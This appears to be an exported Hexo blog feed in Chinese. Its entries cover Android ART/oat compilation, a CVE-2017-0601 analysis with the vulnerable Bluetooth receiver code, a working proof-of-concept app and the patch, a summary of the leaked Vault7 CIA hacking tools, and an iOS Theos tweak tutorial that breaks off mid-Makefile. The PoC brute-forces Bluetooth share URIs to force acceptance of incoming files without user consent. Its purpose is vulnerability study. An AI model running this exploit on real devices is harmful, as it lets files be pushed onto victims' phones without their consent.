<h2 id="dalvik-优化-dex-到-odex"><a href="#dalvik-优化-dex-到-odex" class="headerlink" title="dalvik 优化 dex 到 odex"></a>dalvik 优化 dex 到 odex</h2><p>APK在安装的时候，安装服务PackageManagerService会通过守护进程installd调用一个工具dexopt对打包在APK里面包含有Dex字节码的classes.dex进行优化，优化得到的文件保存在/data/dalvik-cache目录中，并且以.odex为后缀名，表示这是一个优化过的Dex文件。</p>
<h2 id="art-优化-dex-到本地机器指令-还保存为以前的-odex-文件）"><a href="#art-优化-dex-到本地机器指令-还保存为以前的-odex-文件）" class="headerlink" title="art 优化 dex 到本地机器指令 (还保存为以前的 odex 文件）"></a>art 优化 dex 到本地机器指令 (还保存为以前的 odex 文件）</h2><p>在ART运行时中，APK在安装的时候，同样安装服务PackageManagerService会通过守护进程installd调用另外一个工具dex2oat对打包在APK里面包含有Dex字节码进翻译。这个翻译器实际上就是基于LLVM架构实现的一个编译器，它的前端是一个Dex语法分析器。翻译后得到的是一个ELF格式的oat文件，这个oat文件同样是以.odex后缀结束，并且也是保存在/data/dalvik-cache目录中。</p>
<h2 id="oat-文件格式"><a href="#oat-文件格式" class="headerlink" title="oat 文件格式"></a>oat 文件格式</h2><p>oat 比正常的 ELF 可执行文件多了 oatdata 和 oatexec段。</p>
<ul>
<li>oatdata 段 保存apk 中原始的 dex 文件</li>
<li>oatexec 段 保存翻译过后的 机器指令</li>
</ul>
<p><img src="/include/img/oat.png" alt="图4 ART翻译classes.dex后得到的ELF格式的oat文件"></p>
<p>后续内容：<br>ART加载oat文件的过程。<br>ART查找类和方法的过程。<br>ART查找类方法的本地机器指令的过程。<br>Dalvik虚拟机的垃圾收集过程。<br>ART的垃圾收集过程。</p>
<h1 id="Android-ART运行时无缝替换Dalvik虚拟机的过程分析"><a href="#Android-ART运行时无缝替换Dalvik虚拟机的过程分析" class="headerlink" title="Android ART运行时无缝替换Dalvik虚拟机的过程分析"></a><a href="http://blog.csdn.net/luoshengyang/article/details/18006645" target="_blank" rel="external">Android ART运行时无缝替换Dalvik虚拟机的过程分析</a></h1><p>本文主要 结合源代码分析 art 替换 dalvik 需要做的工作。<br>总结下来就2部分：</p>
<ul>
<li>创建虚拟机 ART 虚拟机</li>
<li>将dex 翻译成 oat 的过程</li>
</ul>
<h2 id="创建虚拟机-ART-虚拟机"><a href="#创建虚拟机-ART-虚拟机" class="headerlink" title="创建虚拟机 ART 虚拟机"></a>创建虚拟机 ART 虚拟机</h2><p>这个过程要从 系统启动开始。</p>
<p>回忆一下 dalvik 虚拟的创建过程，是由 Zygote 进程完成，之后的所有进程都是从 zygote 孵化而来。</p>
<p><img src="/include/img/startVm.png" alt=""></p>
<h2 id="将dex-翻译成-oat-的过程"><a href="#将dex-翻译成-oat-的过程" class="headerlink" title="将dex 翻译成 oat 的过程"></a>将dex 翻译成 oat 的过程</h2><ul>
<li>在安装 apk 时会进行一次对待安装 app 的翻译</li>
<li>在系统启动时，会对 /system/app 、/data/app、/system/framework 目录下的 apk 或者 jar 文件，以及这些 APK 所引用的外部 JAR，进行 dex 到 oat 的翻译。</li>
</ul>
<p>上述2条翻译的路线都是从 PMS 开始，最后一直到生成 odex文件结束。</p>
<p><img src="/include/img/dex2oat.png" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;作者：FloatingGuy 转载请注明出处：&lt;a href=&quot;https://floatingguy.github.io/&quot;&gt;https://floatingguy.github.io/&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;学习老罗的文章，简单记录一下&lt;br&gt;&lt;a href=&quot;http://blog.csdn.net/luoshengyang/article/details/39256813&quot;&gt;Android运行时ART简要介绍和学习计划&lt;/a&gt;&lt;br&gt;
    
    </summary>
    
      <category term="研究" scheme="http://yoursite.com/categories/categories-research/"/>
    
    
      <category term="ART虚拟机" scheme="http://yoursite.com/tags/ART%E8%99%9A%E6%8B%9F%E6%9C%BA/"/>
    
      <category term="Android OS" scheme="http://yoursite.com/tags/Android-OS/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2017-0601 Android 蓝牙app 漏洞</title>
    <link href="http://yoursite.com/2017/05/15/CVE-2017-0601-Android-%E8%93%9D%E7%89%99app-%E6%BC%8F%E6%B4%9E/"/>
    <id>http://yoursite.com/2017/05/15/CVE-2017-0601-Android-蓝牙app-漏洞/</id>
    <published>2017-05-15T03:54:55.000Z</published>
    <updated>2017-05-20T04:37:24.000Z</updated>
    
    <content type="html"><![CDATA[<p>作者：FloatingGuy 转载请注明出处：<a href="https://floatingguy.github.io/" target="_blank" rel="external">https://floatingguy.github.io/</a></p>
<hr>
<h3 id="关注重点："><a href="#关注重点：" class="headerlink" title="关注重点："></a>关注重点：</h3><ul>
<li><a href="https://my.oschina.net/zhoulc/blog/114507" target="_blank" rel="external">Android系统蓝牙模块设计</a></li>
<li>漏洞类型: App 权限控制不严，导致本地越权接收远程文件</li>
<li>漏洞代码：<a href="http://androidxref.com/7.0.0_r1/xref/packages/apps/Bluetooth/src/com/android/bluetooth/opp/BluetoothOppReceiver.java" target="_blank" rel="external">Android 7.0 BlueTooth App</a></li>
</ul>
<a id="more"></a>
<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><h2 id="影响的机型"><a href="#影响的机型" class="headerlink" title="影响的机型"></a>影响的机型</h2><p>只对7.0 以后的系统的有影响：</p>
<ul>
<li>7.0</li>
<li>7.1.1</li>
<li>7.1.2</li>
</ul>
<h2 id="基本描述"><a href="#基本描述" class="headerlink" title="基本描述"></a>基本描述</h2><p>CVE-2017-0601 蓝牙App暴露了一个广播接收器<br><code>com.android.bluetooth.opp.BluetoothOppReceiver</code>，本地普通App可以向这个Receiver发送广播，<code>android.btopp.intent.action.ACCEPT</code> action 允许绕过用户操作主动接受 文件。</p>
<h1 id="漏洞分析-POC"><a href="#漏洞分析-POC" class="headerlink" title="漏洞分析/POC"></a>漏洞分析/POC</h1><p><a href="https://xianzhi.aliyun.com/forum/read/1570.html" target="_blank" rel="external">[移动安全]【独家】原创蓝牙App漏洞系列分析之一CVE20170601</a></p>
<p>漏洞代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">public void onReceive(Context context, Intent intent) &#123;</div><div class="line">       String action = intent.getAction();</div><div class="line"></div><div class="line">       if (action.equals(BluetoothAdapter.ACTION_STATE_CHANGED)) &#123;</div><div class="line">               // If this is within a sending process, continue the handle</div><div class="line">               // logic to display device picker dialog.</div><div class="line"></div><div class="line">               ....</div><div class="line">           &#125;</div><div class="line">       &#125; else if (action.equals(Constants.ACTION_ACCEPT)) &#123;</div><div class="line">           //ACTION_ACCEPT = &quot;android.btopp.intent.action.ACCEPT&quot;;</div><div class="line">           if (V) Log.v(TAG, &quot;Receiver ACTION_ACCEPT&quot;);</div><div class="line"></div><div class="line">           Uri uri = intent.getData();</div><div class="line">           ContentValues values = new ContentValues();</div><div class="line">           values.put(BluetoothShare.USER_CONFIRMATION, BluetoothShare.USER_CONFIRMATION_CONFIRMED);</div><div class="line"></div><div class="line">           // 将Intent携带Uri指向的db进行更新，更新为用户确认状态</div><div class="line">           context.getContentResolver().update(uri, values, null, null);</div><div class="line">           cancelNotification(context, uri);</div><div class="line">       &#125;</div></pre></td></tr></table></figure></p>
<p>上面的代码是 7.0 系统中，在6.0.1 不存在<code>Constants.ACTION_ACCEPT</code>.</p>
<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div></pre></td><td class="code"><pre><div class="line">public class MainActivity extends AppCompatActivity &#123;</div><div class="line"></div><div class="line">    ToggleButton toggleButton;</div><div class="line">    Context ctx = this;</div><div class="line">    public static final String ACTION_ACCEPT = &quot;android.btopp.intent.action.ACCEPT&quot;;</div><div class="line">    public static final String BLUETOOTH_SHARE_URI = &quot;content://com.android.bluetooth.opp/btopp/&quot;;</div><div class="line">    boolean Flag = false;</div><div class="line"></div><div class="line">    // 此POC 在 android 6.0.1 上测试没有效果</div><div class="line">    // https://xianzhi.aliyun.com/forum/read/1570.html</div><div class="line"></div><div class="line">    @Override</div><div class="line">    protected void onCreate(Bundle savedInstanceState) &#123;</div><div class="line">        super.onCreate(savedInstanceState);</div><div class="line">        setContentView(R.layout.activity_main);</div><div class="line"></div><div class="line">        final Runnable mRunnable = new Runnable() &#123;</div><div class="line">            @Override</div><div class="line">            public void run() &#123;</div><div class="line">                try &#123;</div><div class="line">                    while (Flag) &#123;</div><div class="line">                        Intent intent = new Intent();</div><div class="line">                        intent.setComponent(new ComponentName(&quot;com.android.bluetooth&quot;,</div><div class="line">                                &quot;com.android.bluetooth.opp.BluetoothOppReceiver&quot;));</div><div class="line">                        intent.setAction(ACTION_ACCEPT);</div><div class="line">                        // Guess the incoming bluetooth share uri, normally it increases from 1 by 1 and could be guessed easily.</div><div class="line">                        // Then Send broadcast to change the incoming file status</div><div class="line">                        for (int i = 0 ; i &lt; 255; i++) &#123;</div><div class="line">                            String uriString = BLUETOOTH_SHARE_URI + Integer.toString(i);</div><div class="line">                            intent.setData(Uri.parse(uriString));</div><div class="line">                            sendBroadcast(intent);</div><div class="line">                        &#125;</div><div class="line">                    &#125;</div><div class="line"></div><div class="line">                &#125;catch (Exception e) &#123;</div><div class="line">                    e.printStackTrace();</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">        &#125;;</div><div class="line"></div><div class="line">        toggleButton = (ToggleButton)findViewById(R.id.toggleButton);</div><div class="line">        toggleButton.setOnClickListener( new View.OnClickListener() &#123;</div><div class="line">            @Override</div><div class="line">            public void onClick(View view) &#123;</div><div class="line">                Thread thread = new Thread(mRunnable);</div><div class="line"></div><div class="line">                // turn on</div><div class="line">                if (toggleButton.isChecked()) &#123;</div><div class="line">                    Toast.makeText(ctx, &quot;checked&quot;, Toast.LENGTH_SHORT).show();</div><div class="line">                    Flag = true;</div><div class="line">                    thread.start();</div><div class="line"></div><div class="line"></div><div class="line">                &#125; else &#123;  //turn off</div><div class="line">                    Toast.makeText(ctx, &quot;not checked&quot;, Toast.LENGTH_SHORT).show();</div><div class="line">                    Flag = false;</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">        &#125;);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h1 id="补丁"><a href="#补丁" class="headerlink" title="补丁"></a>补丁</h1><p>将 bluetooth app 使用action 保护起来， 只允许系统应用发送该 action 的广播。参考：<a href="http://blog.csdn.net/taylorpotter/article/details/70194248" target="_blank" rel="external">protected-broadcast 系统应用自定义广播规范</a><br><code>framework/base/core/res/AndroidManifest.xml</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"> &lt;protected-broadcast android:name=&quot;android.btopp.intent.action.OPEN_INBOUND&quot; /&gt;</div><div class="line">     &lt;protected-broadcast android:name=&quot;android.btopp.intent.action.TRANSFER_COMPLETE&quot; /&gt;</div><div class="line">     &lt;protected-broadcast android:name=&quot;com.android.bluetooth.gatt.REFRESH_BATCHED_SCAN&quot; /&gt;</div><div class="line">+    &lt;protected-broadcast android:name=&quot;android.btopp.intent.action.ACCEPT&quot; /&gt;</div><div class="line">+    &lt;protected-broadcast android:name=&quot;android.btopp.intent.action.DECLINE&quot; /&gt;</div><div class="line">     &lt;protected-broadcast android:name=&quot;com.android.bluetooth.pbap.authchall&quot; /&gt;</div><div class="line">     &lt;protected-broadcast android:name=&quot;com.android.bluetooth.pbap.userconfirmtimeout&quot; /&gt;</div><div class="line">     &lt;protected-broadcast android:name=&quot;com.android.bluetooth.pbap.authresponse&quot; /&gt;</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;作者：FloatingGuy 转载请注明出处：&lt;a href=&quot;https://floatingguy.github.io/&quot;&gt;https://floatingguy.github.io/&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&quot;关注重点：&quot;&gt;&lt;a href=&quot;#关注重点：&quot; class=&quot;headerlink&quot; title=&quot;关注重点：&quot;&gt;&lt;/a&gt;关注重点：&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://my.oschina.net/zhoulc/blog/114507&quot;&gt;Android系统蓝牙模块设计&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;漏洞类型: App 权限控制不严，导致本地越权接收远程文件&lt;/li&gt;
&lt;li&gt;漏洞代码：&lt;a href=&quot;http://androidxref.com/7.0.0_r1/xref/packages/apps/Bluetooth/src/com/android/bluetooth/opp/BluetoothOppReceiver.java&quot;&gt;Android 7.0 BlueTooth App&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="漏洞" scheme="http://yoursite.com/categories/categories-exploit/"/>
    
    
      <category term="app漏洞" scheme="http://yoursite.com/tags/app%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="蓝牙" scheme="http://yoursite.com/tags/%E8%93%9D%E7%89%99/"/>
    
  </entry>
  
  <entry>
    <title>CIA 武器库</title>
    <link href="http://yoursite.com/2017/05/03/CIA-%E6%AD%A6%E5%99%A8%E5%BA%93/"/>
    <id>http://yoursite.com/2017/05/03/CIA-武器库/</id>
    <published>2017-05-03T00:53:14.000Z</published>
    <updated>2017-05-20T04:37:24.000Z</updated>
    
    <content type="html"><![CDATA[<p>作者：FloatingGuy 转载请注明出处：<a href="https://floatingguy.github.io/" target="_blank" rel="external">https://floatingguy.github.io/</a></p>
<hr>
<p>2017.3 月开始 维基解密陆续对 CIA 泄露出的数据进行曝光，截至目前已经曝光了3此。</p>
<p>本文特意将 曝光的内容进行整理。</p>
<ul>
<li>第一系列 — Year Zero （元年）</li>
<li>第二系列 — <a href="https://wikileaks.org/vault7/darkmatter/releases/" target="_blank" rel="external">Dark Matter</a></li>
<li>第三系列 — Marble 混淆工具</li>
</ul>
<a id="more"></a>
<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>第一系列应该是维基解密总结了所有情报以后对 CIA 间谍行为的汇总，这里大部分是介绍 CIA 有那些项目，项目的大概功能以及CIA 的组织架构。</p>
<p>第二系列 CIA 开发了 <a href="https://wikileaks.org/vault7/darkmatter/document/SonicScrewdriver_1p0/SonicScrewdriver_1p0.pdf" target="_blank" rel="external"><code>Sonic Screwdriver</code></a> 项目主要是开发向 MAC 和 iOS 设备的固件系统（UEFI、EFI）植入恶意软件或者利用漏洞达到监控用户的目的。</p>
<p>第三系列 提供了一套代码混淆的工具 Marble 的源码, <a href="https://mp.weixin.qq.com/s?__biz=MzAwNTI1NDI3MQ%3D%3D&amp;mid=2649612204&amp;idx=1&amp;sn=d05624a73eefd7c6bfa674b22e812e4d&amp;chksm=830602bcb4718baab293b75c598eb32fee653404eeaffd8b60f59d7d944bd283e01453c5243a&amp;mpshare=1&amp;scene=23&amp;srcid=042658zyrElHBz1TOxV2gN4X#rd" target="_blank" rel="external">网络上公开的分析报告</a></p>
<h1 id="组织架构"><a href="#组织架构" class="headerlink" title="组织架构"></a>组织架构</h1><p><img src="/include/img/cia_vault7.png" alt="CIA 机构划分"></p>
<h2 id="EBD："><a href="#EBD：" class="headerlink" title="EBD："></a>EBD：</h2><ul>
<li>BaldEagle：针对Unix系统硬件抽象层的HALdaemon漏洞利用工具；（vault7中出现次数：27）</li>
<li>MaddeningWhispers：针对Vanguard设备进行远程入侵的漏洞利用工具；（vault7中出现次数：34）</li>
<li>CRUCIBLE：自动化的可利用漏洞识别（automatedexploit identification）工具；（vault7中出现的次数：8）</li>
<li>YarnBall：在部署有效载荷或数据窃取时使用的隐蔽USB存储工具；（vault7中出现次数：43）</li>
<li>GreenPacket：针对GreenPacket路由设备进行木马植入的工具套装；（vault7中出现次数：11）</li>
<li>QuarkMatter：另一款针对OSX系统的启动驱动级植入木马；（vault7中出现次数：40）</li>
<li>Weeping Angel：由CIA和英国MI5共同开发的针对三星智能电视的木马植入工具组件。该窃听软件感染智能电视后，会劫持电视的关机操作，保持程序的后</li>
<li><p>运行，让用户误以为已经关机了，之后它会启动麦克风，开启录音功能，然后将录音内容回传到CIA的后台服务器；（vault7中出现次数：65）</p>
</li>
<li><p>Hive：针对Windows和UNIX系统，为其它攻击部署和工具提供入侵协助的组件平台；（vault7中出现次数：197）</p>
</li>
<li>Honeycomb：用于配合Hive，运行于linux系统的，针对Swindle或Blot代理服务器的数据收集处理脚本工具；（vault7中出现次数：78）</li>
<li>CutThroat：构建于代理服务器之上，用于向目标系统发送数据的虚拟机接口；（vault7中出现次数：232）</li>
<li>Bee Sting：用于HTTP连接中的iFrame注入工具；（vault7中出现次数：21）</li>
<li>Sontaran：用于针对西门子OpenStage数字电话进行入侵的工具；（vault7中出现次数：83）</li>
<li>Secret Squirrel (SQRL)：由远程研发部门RDB和嵌入式研发部门共同开发的工具，目前还不知晓具体用途 。</li>
</ul>
<h2 id="REB"><a href="#REB" class="headerlink" title="REB"></a>REB</h2><ul>
<li>Umbrage：一项团队模式的网络攻击平台，CIA技术人员通过该平台收集大量公开的黑客工具、攻击技术、一些泄露数据中包含的可用代码和相关思路方法，以此形成一个网络攻击特征库，可应用于网络攻击活动的调查取证。另据其* 它媒体报道，CIA可以通过该特征库采取模仿、混淆等多种战术，发起针对目标系统的“虚假标记”网络攻击，故意留下蛛丝马迹，让人作出错误判断，达到迷惑敌人、嫁祸于人，隐藏自己的目的。（vault7中出现次数：46）</li>
<li>ShoulderSurfer：从MicrosoftExchange中提取数据的工具；（vault7中出现次数：43）</li>
</ul>
<h2 id="OSB："><a href="#OSB：" class="headerlink" title="OSB："></a>OSB：</h2><ul>
<li><a href="http://www.freebuf.com/articles/system/133702.html" target="_blank" rel="external">Scribbles</a>: 这是一个文档预处理系统，用于给涉密文档打上“Web beacon”类型的追踪水印。</li>
<li>Time Stomper：用来在特定网络入侵行动中修改攻击载荷时间戳属性的工具；（vault7中出现次数：12）</li>
<li>Munge Payload：对攻击载荷进行加密和免杀处理的工具；（vault7中出现次数：65）</li>
<li>Magical Mutt：可以实现恶意DLL注入并能监控目标系统进程的工具；（vault7中出现次数：16）</li>
<li>Flash Bang：浏览器沙箱逃逸和劫持工具，当成功逃逸或劫持后，可以实现对目标系统的进一步提权操作；vault7中出现的次数：27</li>
<li>RickyBobby：以电影《塔拉德加之夜》中的角色RickyBobby命名，包含多种DLL攻击文件和执行脚本的一款轻量级的远控植入工具，可以实现对目标系统的端口监听、上传和下载和命令执行等功能；（vault7中出现次数：21）</li>
<li>Fight Club：在特定攻击活动中，利用移动载体作为传播中介，通过在VLC、WinRAR、TrueCrypt、Shamela和Microsoft Office等软件安装程序中捆绑RickyBobby远控，，实现控制感染目标系统的工具组件；（vault7中出现次数：21）</li>
<li>Melomy DriveIn：劫持VLC播放器DLL进程，间接植入RickyBobby远控；（vault7中出现次数：9）</li>
<li>Rain Maker：隐藏于绿色版VLC播放器程序中，利用移动载体作为感染传播中介，当用户向网络隔离的目标系统中插入感染U盘介质时，可以隐蔽实施对网络离系统的文件窃取和信息收集；（vault7中出现次数：101）</li>
<li>Improvise：支持Windows、Mac和Linux主流操作系统的数据收集和窃取工具，可以用于攻击配置、数据后处理、Payload调整设置和攻击方法选择的工具</li>
<li>。针对不同的攻击目标系统，还定义了极具酒吧韵味的名字：Margarita, Dancefloor, Jukebox；（vault7中出现次数：28）</li>
<li>Basic Bit：一款针对Windows系统的键盘记录工具；（vault7中出现次数：158）</li>
<li>Fine Dining：为执行入侵任务的技术特工提供的一系列定制服务，如生成一个伪装的PDF文档，利用该文档在目标Mac系统中执行文件搜集任务，或对特定</li>
<li>序执行DLL劫持；（vault7中出现次数：53）</li>
<li>HammerDrill：利用CD/DVD作为传播感染介质，通过向磁盘中写入恶意代码，实现对目标系统的感染控制；vault7中出现的次数：在HammerDrill</li>
<li>v2.0版本中还有一项功能：若目标系统正在使用Nero进行软件刻录，就会在刻录的新盘中安装32-bit的隐藏木马程序；（vault7中出现次数：12）</li>
<li>Taxman ：（vault7中无介绍）</li>
<li>HyenasHurdle ：（vault7中无介绍）</li>
</ul>
<h2 id="ABI"><a href="#ABI" class="headerlink" title="ABI"></a>ABI</h2><ul>
<li>Frog Prince：全功能木马远控植入集成系统，包括C&amp;C控制端、端口监听和植入软件；（vault7中出现次数：38）</li>
<li>Grasshopper：针对Windows系统的一个高度可配置木马远控植入工具；（vault7中出现次数：91）</li>
<li>Caterpillar：通过安全传输方式从目标系统获取文件的工具；（vault7中出现次数：85）</li>
<li>AntHill：似乎是一个远控植入软件用来进行文件管理的组件；（vault7中出现次数：28）</li>
<li>The Gibson：似乎是一个用来进行C&amp;C控制和监听的程序组件；（vault7中出现次数：19）</li>
<li>Galleon：从目标计算机中把文件通过安全传输方式复制到控制端的一组脚本和工具集；（vault7中出现次数：38）</li>
<li>Assassin：（vault7中无介绍）</li>
<li>HercBeetle – （vault7中无介绍）</li>
<li>CandyMountain –（vault7中无介绍）</li>
<li>Hornet – （vault7中无介绍）</li>
<li>Cascade –（vault7中无介绍）</li>
<li>MagicVikings – （vault7中无介绍）</li>
</ul>
<h1 id="相关的报道"><a href="#相关的报道" class="headerlink" title="相关的报道"></a>相关的报道</h1><ul>
<li><a href="https://threatpost.com/wikileaks-dump-shows-cia-interdiction-of-iphone-supply-chain/124540/" target="_blank" rel="external">WikiLeaks Dump Shows CIA Interdiction of iPhone Supply Chain</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;作者：FloatingGuy 转载请注明出处：&lt;a href=&quot;https://floatingguy.github.io/&quot;&gt;https://floatingguy.github.io/&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;2017.3 月开始 维基解密陆续对 CIA 泄露出的数据进行曝光，截至目前已经曝光了3此。&lt;/p&gt;
&lt;p&gt;本文特意将 曝光的内容进行整理。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;第一系列 — Year Zero （元年）&lt;/li&gt;
&lt;li&gt;第二系列 — &lt;a href=&quot;https://wikileaks.org/vault7/darkmatter/releases/&quot;&gt;Dark Matter&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;第三系列 — Marble 混淆工具&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="研究" scheme="http://yoursite.com/categories/categories-research/"/>
    
    
      <category term="CIA" scheme="http://yoursite.com/tags/CIA/"/>
    
  </entry>
  
  <entry>
    <title>浅谈Tweak 开发</title>
    <link href="http://yoursite.com/2017/04/30/%E5%BC%80%E5%8F%91/%E6%B5%85%E8%B0%88Tweak-%E5%BC%80%E5%8F%91/"/>
    <id>http://yoursite.com/2017/04/30/开发/浅谈Tweak-开发/</id>
    <published>2017-04-30T01:53:29.000Z</published>
    <updated>2017-05-23T13:29:45.000Z</updated>
    
    <content type="html"><![CDATA[<p>作者：FloatingGuy 转载请注明出处：<a href="https://floatingguy.github.io/" target="_blank" rel="external">https://floatingguy.github.io/</a></p>
<hr>
<a id="more"></a>
<h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><p>详情参考：<a href="http://iphonedevwiki.net/index.php/Cydia_Substrate#Example_code" target="_blank" rel="external">iOS 越狱的Tweak开发</a></p>
<p>新版的已经是内置CydiaSubstrate.framework,不是网上其它教程中说的需要运行bootstrap.sh脚本或者是从手机上拷贝等方式.</p>
<h1 id="Theos-使用方法"><a href="#Theos-使用方法" class="headerlink" title="Theos 使用方法"></a>Theos 使用方法</h1><p>Theos 当前有12种模板，这里拿书中的 iOSREProject tweak 工程的例子做演示。</p>
<ul>
<li><p>创建项目<br><code>nic.pl</code></p>
</li>
<li><p>模板类型：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">iOS_Tweak $ nic.pl</div><div class="line">NIC 2.0 - New Instance Creator</div><div class="line">------------------------------</div><div class="line">  [1.] iphone/activator_event</div><div class="line">  [2.] iphone/application_modern</div><div class="line">  [3.] iphone/cydget</div><div class="line">  [4.] iphone/flipswitch_switch</div><div class="line">  [5.] iphone/framework</div><div class="line">  [6.] iphone/ios7_notification_center_widget</div><div class="line">  [7.] iphone/library</div><div class="line">  [8.] iphone/notification_center_widget</div><div class="line">  [9.] iphone/preference_bundle_modern</div><div class="line">  [10.] iphone/tool</div><div class="line">  [11.] iphone/tweak</div><div class="line">  [12.] iphone/xpc_service</div></pre></td></tr></table></figure>
</li>
</ul>
<p>初级阶段常用的类型是：2, 10, 11,</p>
<ul>
<li><p>项目类型：<br>Choose a Template (required): <code>11</code></p>
</li>
<li><p>工程名称：<br>Project Name (required): <code>iOSREProject</code></p>
</li>
<li><p>deb 包名<br>Package Name [com.yourcompany.iosreproject]: <code>com.iosre.iosreproject</code></p>
</li>
<li><p>tweak 作者：<br>Author/Maintainer Name [xx]: <code>xx</code></p>
</li>
<li><p>tweak 作用的对象（指定要 hook的目标APP 的 bundle identifier）<br>[iphone/tweak] MobileSubstrate Bundle filter [com.apple.springboard]: <code>com.apple.springboard</code></p>
</li>
<li><p>tweak 安装完以后要重启的应用<br>[iphone/tweak] List of applications to terminate upon installation (space-separated, ‘-‘ for none) [SpringBoard]: <code>SpringBoard</code></p>
</li>
</ul>
<p>Instantiating iphone/tweak in iosreproject/…<br>Done.</p>
<h2 id="文件结构"><a href="#文件结构" class="headerlink" title="文件结构"></a>文件结构</h2><p>当前创建了一个 tweak 项目，在工程目录下只有4个文件：</p>
<p><a href="#m">Makefile</a><br><a href="#c">control</a><br><a href="#i">iOSREProject.plist</a><br><a href="#t">Tweak.xm</a></p>
<h3 id="Makefile"><a href="#Makefile" class="headerlink" title="Makefile"></a><span id="m">Makefile</span></h3><p>这是一个编译脚本</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#### 额外的编译参数</span></div><div class="line"><span class="comment"># 目标的 ip</span></div><div class="line">THEOS_DEVICE_IP = iosIP</div><div class="line"></div><div class="line"><span class="comment"># 处理器架构</span></div><div class="line">ARCHS = armv7 arm64</div><div class="line"></div><div class="line"><span class="comment"># SDK 版本</span></div><div class="line"><span class="comment"># TARGET = iphone: BASE SDK 编译使用的 SDK 版本:  Deployment target 发布的机型系统版本</span></div><div class="line"><span class="comment"># TARGET = iphone:latest:8.0</span></div><div class="line">TARGET = iphone:8.1:8.0</div><div class="line"></div><div class="line"><span class="comment"># 必须导入的标准编译脚本</span></div><div class="line">include $(THEOS)/makefiles/common.mk</div><div class="line"></div><div class="line"><span class="comment"># Project name</span></div><div class="line">TWEAK_NAME = iOSREProject</div><div class="line"></div><div class="line"><span class="comment"># Source files</span></div><div class="line">iOSREProject_FILES = Tweak.xm</div><div class="line"></div><div class="line"><span class="comment"># 根据选择的模板类型 导入编译脚本</span></div><div class="line">include $(THEOS_MAKE_PATH)/tweak.mk</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># 导入 framework</span></div><div class="line">iOSREProject_FRAMEWORKS = UIKit CoreTelephony CoreAudio</div><div class="line"></div><div class="line"><span class="comment"># 导入 privete framework</span></div><div class="line">iOSREProject_PRIVATE_FRAMEWORKS = AppSupport ChatKit IMCore BaseBoard</div><div class="line"></div><div class="line"><span class="comment"># 安装以后, 